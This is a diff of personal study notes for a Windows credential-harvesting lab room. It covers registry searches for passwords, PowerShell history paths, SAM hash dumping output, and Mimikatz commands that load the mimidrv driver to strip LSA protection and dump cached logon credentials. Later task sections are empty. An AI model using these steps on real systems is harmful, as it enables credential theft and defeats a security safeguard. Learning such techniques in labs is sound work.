@@ -1,7 +1,24 @@
 # Credharvesting
 - After gaining access to a system we need to find creds.
 
-## Credentials are stored insecurely in various locations in systems:
+## Task 1 Intro
+### Learning Objectives
+- Understand the method of extracting credentials from local windows (SAM database)
+- Learn how to access Windows memory and dump clear-text passwords and authentication tickets locally and remotely.
+- Introduction to Windows Credentials Manager and how to extract credentials.
+- Learn methods of extracting credentials for Domain Controller
+- Enumerate the Local Administrator Password Solution (LAPS) feature.
+- Introduction to AD attacks that lead to obtaining credentials.
+
+
+## Task 2 Credential Harvesting
+Credentials can be found in a variety of different forms, such as:
+- Accounts details (usernames and passwords)
+- Hashes that include NTLM hashes, etc.
+- Authentication Tickets: Tickets Granting Ticket (TGT), Ticket Granting Server (TGS)
+- Any information that helps login into a system (private keys, etc.)
+## Task 3 Credential Access
+Credentials are stored insecurely in various locations in systems:
 -   Clear-text files
  -   Database files
  -   Memory
@@ -10,7 +27,7 @@
  -   Active Directory
  -   Network Sniffing
 
-## The following are some of the types of clear-text files that an attacker may be interested in:
+### The following are some of the types of clear-text files that an attacker may be interested in:
 - Commands history
 -  Configuration files (Web App, FTP files, etc.)
 - Other Files related to Windows Applications (Internet Browsers, Email Clients, etc.)
@@ -19,15 +36,14 @@
 - Registry
 - Source code 
 
-## As an example of a history command, a PowerShell saves executed PowerShell commands in a history file in a user profile in the following path: 
+### As an example of a history command, a PowerShell saves executed PowerShell commands in a history file in a user profile in the following path: 
     C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt 
 
     
-## Searching for the "password" keyword in the Registry        
+### Searching for the "password" keyword in the Registry        
 - c:\Users\user> reg query HKLM /f password /t REG_SZ /s
 - C:\Users\user> reg query HKCU /f password /t REG_SZ /s
 
-## Task 3
 Use the methods shown in this task to search through the Windows registry for an entry called "flag" which contains a password. What is the password?
 Use findstr to grep THM text only
 
@@ -56,7 +72,7 @@ THM Admin BK  bk-admin
 test          test-user
 sshd          sshd
 ```
-## Task 4
+## Task 4 Local Windows Credentials
 Confirming No Access to the SAM Database 
 ```
 C:\Windows\system32>type c:\Windows\System32\config\sam
@@ -129,5 +145,78 @@ DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c0
 [-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
 [*] Cleaning up...
 ```
-## Task 5
+## Task 5 Local Security Authority Subsystem Service (LSASS)
+
+- Disable Protected LSASS
+-in admin cmd run ```cd C:\Tools\Mimikatz```
+- ``` mimikatz.exe```
+
+
+In 2012, Microsoft implemented an LSA protection, to keep LSASS from being accessed to extract credentials from memory. This task will show how to disable the LSA protection and dump credentials from memory using Mimikatz. To enable LSASS protection, we can modify the registry RunAsPPL DWORD value in HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa to 1.
+
+- The steps are similar to the previous section, which runs the Mimikatz execution file with admin privileges and enables the debug mode. If the LSA protection is enabled, we will get an error executing the "sekurlsa::logonpasswords" command.
+- Failing to Dump Stored Password Due to the LSA Protection
+
+           mimikatz # sekurlsa::logonpasswords
+           ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
+
+        
+
+-The command returns a 0x00000005 error code message (Access Denied). Lucky for us, Mimikatz provides a mimidrv.sys driver that works on kernel level to disable the LSA protection. We can import it to Mimikatz by executing "!+" as follows,
+
+Loading the mimidrv Driver into Memory
+
+           
+```mimikatz # !+
+[*] 'mimidrv' service not present
+[+] 'mimidrv' service successfully registered
+[+] 'mimidrv' service ACL to everyone
+[+] 'mimidrv' service started
+``` 
+
+- Note: If this fails with an isFileExist error, exit mimikatz, navigate to C:\Tools\Mimikatz\ and run the command again.
+- Once the driver is loaded, we can disable the LSA protection by executing the following Mimikatz command:
+
+### Removing the LSA Protection
+
+    mimikatz # !processprotect /process:lsass.exe /remove
+    Process : lsass.exe
+    PID 528 -> 00/00 [0-0-0]
+-Now, if we try to run the "sekurlsa::logonpasswords" command again, it must be executed successfully and show cached credentials in memory.
+
+
+## Task 6 Windows Credential Manager
+
+
+
+
+
+
+
+
+
+
+## Task 7 Domain Controller
+
+
+
+
+
+
+
+
+
+
+
+## Task 8 Local Administrator Password Solution (LAPS)
+
+
+
+## Task 9 Other Attacks
+
+
+
+## Task 10 Conclusion 
+        
+
 
